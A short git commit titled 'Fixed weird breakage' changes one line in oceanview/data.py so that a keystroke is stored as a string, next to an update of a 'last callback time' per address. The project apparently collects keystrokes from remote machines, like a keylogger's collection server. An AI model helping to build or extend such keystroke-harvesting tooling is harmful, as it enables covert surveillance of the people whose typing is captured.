028f973941e2bbe0636231f9229e299132d19187
Chris Vantine <justchris.vantine@gmail.com>
2018-02-25 01:02:16 -0500

    Fixed weird breakage

--- oceanview/data.py
+++ oceanview/data.py
@@ -120,7 +120,7 @@ class Database(object):
         # Update the last callback time
         self.cur.execute(qry1, (addr,))
         # Add the keystroke to the database
-        self.cur.execute(qry2, (addr, keystroke))
+        self.cur.execute(qry2, (addr, keystroke.string()))
         # Write the changes to the DB
         self.conn.commit()
 
